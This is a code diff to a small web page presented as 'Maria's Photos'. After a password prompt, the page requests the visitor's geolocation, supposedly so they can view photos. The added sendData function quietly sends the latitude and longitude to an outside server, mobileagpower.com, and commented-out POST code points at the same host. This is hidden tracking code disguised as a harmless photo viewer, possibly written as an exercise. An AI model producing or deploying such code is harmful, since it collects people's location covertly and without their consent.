@@ -2,7 +2,7 @@
 <html>
 <body>
 
-<p><h1>Maria's Phots</h1></p>
+<p><h1>Maria's Photos</h1></p>
 
 <button onclick="getLocation()">View photos</button>
 
@@ -13,10 +13,12 @@
 <script>
 var x = document.getElementById("demo");
 var y = document.getElementById("image");
+var lat = "";
+var lon = "";
 
 function getLocation() {
   var z = prompt('Enter Password: ');
-  if (z!="g$l3HZ") {x.innerHTML = "Incorrect Password!"}
+  if (z!="test") {x.innerHTML = "Incorrect Password!"}
   else if (navigator.geolocation) {
     navigator.geolocation.getCurrentPosition(showPosition, showError);
   } else {
@@ -24,19 +26,46 @@ function getLocation() {
   }
 }
 
-var fs = require('fs');
+function sendData()
+{
+  var str = "hello world";
+  var xmlhttp = new XMLHttpRequest();
+  xmlhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+    document.getElementById("txtHint").innerHTML = this.responseText;
+  }
+};
+xmlhttp.open("GET","http://www.mobileagpower.com/test_record.php?lat="+lat+"&lon="+lon,true);
+xmlhttp.send();
 
+
+
+	// const form = new FormData();
+	// const request = new XMLHttpRequest();
+	// request.onreadystatechange = function()
+	// {
+	// 	if (this.readyState == 4 && this.status == 200)
+	// 	{
+	// 		console.log("Sent data");
+	// 	}
+	// 	else if (this.readyState == 4 && this.status == 500)
+	// 	{
+	// 		console.log("It broke.");
+	// 	}
+	// };
+	// request.open("POST", "http://www.mobileagpower.com/test_record.php");
+	// form.append("q", "data"); //This probably won't work.  You'll need to convert something in the navigator object to a string.
+	// request.send(form);
+}
 
 
 function showPosition(position) {
-  // var alocation = "Latitude: " + position.coords.latitude +
-  // "<br>Longitude: " + position.coords.longitude;
-
-  // fs.appendFile('data.txt', 'alocation', function (err) {
-  //   if (err) throw err;
-  //   console.log('Updated!');
-  // });
-  
+  var alocation = "Latitude: " + position.coords.latitude +
+  "<br>Longitude: " + position.coords.longitude;
+  x.innerHTML = alocation;
+  lat = position.coords.latitude;
+  lon = position.coords.longitude;
+  sendData();
   y.src = "screenshot1.jpg";
 }
 
